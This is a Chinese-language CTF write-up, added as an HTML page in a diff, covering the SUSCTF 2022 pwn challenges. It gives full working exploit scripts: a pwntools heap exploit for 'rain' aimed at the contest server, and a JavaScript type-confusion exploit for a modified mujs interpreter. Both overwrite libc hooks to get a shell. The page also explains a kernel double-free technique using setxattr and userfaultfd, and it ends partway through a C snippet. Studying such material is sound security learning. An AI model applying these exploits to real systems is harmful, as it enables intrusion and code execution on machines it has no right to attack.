@@ -1,0 +1,559 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SUSCTF2022-PWN-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题，@xi4oyu 和学弟 @h4kuy4 一起解了 happytree 这题，然后我和 @xi4oyu 一起做了 mujs 和 k"><meta property="og:image" content><meta property="og:title" content="SUSCTF2022-PWN-WP"><meta property="og:description" content="这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题，@xi4oyu 和学弟 @h4kuy4 一起解了 happytree 这题，然后我和 @xi4oyu 一起做了 mujs 和 k"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1603.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-01T08:00:00+00:00"><meta property="article:modified_time" content="2022-03-01T08:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SUSCTF2022-PWN-WP"><meta name=twitter:description content="这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题，@xi4oyu 和学弟 @h4kuy4 一起解了 happytree 这题，然后我和 @xi4oyu 一起做了 mujs 和 k"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>SUSCTF2022-PWN-WP</h1><div class=meta>Posted on Mar 1, 2022</div></div><section class=body><p>这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题，<strong>@xi4oyu</strong> 和学弟 <strong>@h4kuy4</strong> 一起解了 happytree 这题，然后我和 <strong>@xi4oyu</strong> 一起做了 mujs 和 kqueue。rain 是一个普通的堆题，比较简单，mujs 是一个 js 解释器 pwn，以前没接触过，小语想出了类型混淆的方法，我借此 debug 调偏移最后成功 getshell。kqueue 被非预期打穿了，我们在比赛期间完全没想通能有什么非预期，就参考了 <strong>L-team @arttnba3</strong> 师傅的<a href=https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#setxattr-userfaultfd-%E5%A0%86%E5%8D%A0%E4%BD%8D%E6%8A%80%E6%9C%AF>这篇文章</a>使用 “setxattr + userfaultfd 堆占位”的方法完成了利用。总的来说，学到了新东西，蛮好。这里总结一下解法。</p><h3 id=rain>rain</h3><p>首先两个结构体猜了一下：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CONFIG</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> height;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> width;
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int8</span> front_color;
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int8</span> back_color;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>**</span>buf1;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> <span style=color:#666>**</span>buf2;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> rainfall;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> speed;
+</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>print_info_func;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>alphabet_table;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>custom_table;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>config_frame</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> height[<span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> width[<span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> front_color;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> back_color;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> rainfall[<span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> fill[<span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> custom_table_buf[];
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p><img src=https://www.cjovi.icu/usr/uploads/2022/02/3592696546.png alt></p><p>v7 为 0 的时候就是 custom_table 被 free 了，即 realloc 的 size 为 0 时，但是没有置零指针，所以可以 UAF。
+执行 rainfall 后，config 结构体会被重新初始化，所以可以获得走 <code>__libc_malloc</code> 的 realloc 机会
+所以多次 double free leak 出 libc，然后通过 rainfall 多次取出 tcache bins，修改 next，打 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> one_gadget getshell</p><p>exp:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./rain&#34;)</span>
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;124.71.185.75&#34;</span>, <span style=color:#40a070>9999</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>config</span>(frame):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;ch&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;FRAME&gt; &#34;</span>, frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>print_info</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;ch&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>rain</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;ch&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> frame<span style=color:#666>.</span>ljust(<span style=color:#40a070>18</span> <span style=color:#666>+</span> <span style=color:#40a070>0x188</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print_info()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Table:&#34;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>12</span>)
+</span></span><span style=display:flex><span>libc_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> libc_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>0x60</span>
+</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>__realloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__realloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>__malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>malloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__libc_malloc&#34;</span>]
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x50</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x50</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(libc_addr) <span style=color:#666>*</span> <span style=color:#40a070>2</span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> frame<span style=color:#666>.</span>ljust(<span style=color:#40a070>18</span> <span style=color:#666>+</span> <span style=color:#40a070>0x180</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x190</span>)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(__realloc_hook)
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> frame<span style=color:#666>.</span>ljust(<span style=color:#40a070>18</span> <span style=color:#666>+</span> <span style=color:#40a070>0x58</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>rain()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#frame += p64(system)</span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> frame<span style=color:#666>.</span>ljust(<span style=color:#40a070>18</span> <span style=color:#666>+</span> <span style=color:#40a070>0x180</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x190</span>)
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>rain()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x10a45c</span>
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0x1</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p32(<span style=color:#40a070>0x0</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(one_gadget) <span style=color:#666>+</span> p64(realloc <span style=color:#666>+</span> <span style=color:#40a070>10</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>=</span> frame<span style=color:#666>.</span>ljust(<span style=color:#40a070>18</span> <span style=color:#666>+</span> <span style=color:#40a070>0x180</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>frame <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x190</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(sh)</span>
+</span></span><span style=display:flex><span>config(frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=mujs>mujs</h3><p>hash 是 commit hash，clone 下来 diff 就行</p><p>分析 diff 发现添加了一个 DataView 类，审计代码发现 setUint8 方法中存在越界，可以 off 9 字节（这里盗用小语的图）
+<img src=https://www.cjovi.icu/usr/uploads/2022/02/3119680431.png alt></p><p>另外，Array 类在 setLength 时，length 增长时没有检测，由此考虑通过溢出修改下一个 DataView 对象的 type 字段为 Array 的 type 实现类型混淆，通过 array 的 setLength 修改 length 字段，然后再修改回 DataView 实现较大范围的 oob。通过 oob leak 出 libc 地址，修改一个 DataView 的 data 指针指向 <code>__free_hook</code>，劫持为 <code>system</code>，最后，通过字符串拼接获得一个存有 <code>'/bin/sh'</code> 的 chunk，重复赋值即可 getshell。</p><p>之后利用的主要难度在于代码的更改会影响到堆的布局，只能说耐心 debug 吧。</p><p>exp：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> test1() {
+</span></span><span style=display:flex><span>    dvFill0 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0xFF8</span>);
+</span></span><span style=display:flex><span>    dvFill1 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill2 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill3 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill4 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill5 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill6 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill7 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x58</span>);
+</span></span><span style=display:flex><span>    dvFill8 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x108</span>);
+</span></span><span style=display:flex><span>    dvFill9 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x1D8</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> dvArr <span style=color:#666>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#007020;font-weight:700>var</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>0x51</span>; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>        dvArr[i] <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x18</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> dv1 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x18</span>);
+</span></span><span style=display:flex><span>    dv1.setUint32(<span style=color:#40a070>0</span>, <span style=color:#40a070>0xDEADBEEF</span>);
+</span></span><span style=display:flex><span>    dv1.setUint32(<span style=color:#40a070>4</span>, <span style=color:#40a070>0x13372333</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> dv2 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x18</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> dv3 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x18</span>);
+</span></span><span style=display:flex><span>    dv3.setUint32(<span style=color:#40a070>0</span>, <span style=color:#40a070>0xDEADBEEF</span>);
+</span></span><span style=display:flex><span>    dv1.setUint8(<span style=color:#40a070>0x18</span> <span style=color:#666>+</span> <span style=color:#40a070>8</span>, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    dv2.length <span style=color:#666>=</span> <span style=color:#40a070>0x7FFFFFFF</span>;
+</span></span><span style=display:flex><span>    dv1.setUint8(<span style=color:#40a070>0x18</span> <span style=color:#666>+</span> <span style=color:#40a070>8</span>, <span style=color:#40a070>0x10</span>);
+</span></span><span style=display:flex><span>    dv4 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x430</span>);
+</span></span><span style=display:flex><span>    dv4 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(<span style=color:#40a070>0x18</span>);
+</span></span><span style=display:flex><span>    dv4.getUint8();
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> libc_low32 <span style=color:#666>=</span> dv2.getUint32(<span style=color:#40a070>0x640</span>, <span style=color:#007020;font-weight:700>true</span>) <span style=color:#666>-</span> <span style=color:#40a070>2014176</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> libc_high32 <span style=color:#666>=</span> dv2.getUint32(<span style=color:#40a070>0x644</span>, <span style=color:#007020;font-weight:700>true</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> libc_base <span style=color:#666>=</span> libc_high32 <span style=color:#666>*</span> <span style=color:#40a070>0x100000000</span> <span style=color:#666>+</span> libc_low32;
+</span></span><span style=display:flex><span>    print(libc_base);
+</span></span><span style=display:flex><span>    dv2.setUint32(<span style=color:#40a070>0x48</span>, libc_low32 <span style=color:#666>+</span> <span style=color:#40a070>2026280</span>);
+</span></span><span style=display:flex><span>    dv2.setUint32(<span style=color:#40a070>0x4C</span>, libc_high32);
+</span></span><span style=display:flex><span>    dv3.setUint32(<span style=color:#40a070>0</span>, libc_low32 <span style=color:#666>+</span> <span style=color:#40a070>349200</span>);
+</span></span><span style=display:flex><span>    dv3.setUint32(<span style=color:#40a070>0x4</span>, libc_high32);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> s1 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> <span style=color:#007020>String</span>(<span style=color:#4070a0>&#34;/bin&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>var</span> s2 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> <span style=color:#007020>String</span>(<span style=color:#4070a0>&#34;/sh&#34;</span>);
+</span></span><span style=display:flex><span>    s <span style=color:#666>=</span> s1 <span style=color:#666>+</span> s2;
+</span></span><span style=display:flex><span>    s <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> <span style=color:#007020>String</span>(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>test1();
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//var dv3 = new DataView(0x10);
+</span></span></span></code></pre></div><h3 id=kqueue--kqueues-revenge>kqueue & kqueue&rsquo;s revenge</h3><p>两个环境用同样的 exp 打通了。</p><p>Linux kernel pwn，使用 slub 分配器，没开启 harden 和 freelist randomize。</p><p>push copy 有没有成功都已经把节点加进去了
+<img src=https://www.cjovi.icu/usr/uploads/2022/02/3287648627.png alt></p><p>pop 的时候锁没加对地方
+<img src=https://www.cjovi.icu/usr/uploads/2022/02/11911276.png alt></p><p>这里的利用手法我们主要参考了<a href=https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9ASECCON-2020-kstack>这篇文章</a></p><p>我简单总结一下这个方法，利用时，通过 setxattr 可以用 kvmalloc 申请任意大小的空间，像其中通过 copy_from_user 写入数据，然后会被 kvfree 掉。为了不让该 slab 被 free 掉，在跨页拷贝时可以做到向申请回来的 chunk 中写入（一部分）数据，然后在 copy 到下一页时，我们通过注册 userfaultfd 卡住该页的拷贝，就可以避免 kvfree 的执行。这样就实现了在用户态 kmalloc 并写入数据的效果。</p><p>那么我们只需要构造 double free 和 leak 即可。</p><p>double free 的办法</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>head        tail
+</span></span><span style=display:flex><span> |            |
+</span></span><span style=display:flex><span>node1  -&gt;   node2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pop1 copy 时 userfaultfd 线程里 pop2
+</span></span></code></pre></div><p>对于 pt_regs，断在 gadget 上</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(gdb) x/20xg 0xffffc90000167f58
+</span></span><span style=display:flex><span>0xffffc90000167f58:     0x00000000beefdead      0x0000000011111111
+</span></span><span style=display:flex><span>0xffffc90000167f68:     0x0000000022222222      0x0000000033333333
+</span></span><span style=display:flex><span>0xffffc90000167f78:     0x0000000044444444      0x0000000055555555
+</span></span><span style=display:flex><span>0xffffc90000167f88:     0x0000000000000246      0x0000000077777777
+</span></span><span style=display:flex><span>0xffffc90000167f98:     0x0000000088888888      0x0000000099999999
+</span></span><span style=display:flex><span>0xffffc90000167fa8:     0xffffffffffffffda      0x000000000040209c
+</span></span><span style=display:flex><span>0xffffc90000167fb8:     0x0000000000000008      0x00007f7fbd637130
+</span></span><span style=display:flex><span>0xffffc90000167fc8:     0x000000000000006b      0x0000000000000000
+</span></span><span style=display:flex><span>0xffffc90000167fd8:     0x000000000040209c      0x0000000000000033
+</span></span><span style=display:flex><span>0xffffc90000167fe8:     0x0000000000000246      0x00007f7fbd637130
+</span></span><span style=display:flex><span>(gdb) p/x $rsp
+</span></span><span style=display:flex><span>$2 = 0xffffc90000167de0
+</span></span></code></pre></div><p>计算得 offset: 0x178</p><p>刚开始ROPgadget和ropper工具都没找到合适的 gadget，最后小语通过 <code>objdump -d</code> vim 打开，眼拔+搜索之后发现一个可用的 gadget 可以滑倒 pt_regs 上。</p><p>另外一个比较重要的点在于需要把进程绑定到一个 CPU 上，也就是 exp 中的这段代码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// 绑定到一个cpu上
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> cpu_mask <span style=color:#666>=</span> <span style=color:#40a070>0x01</span>;
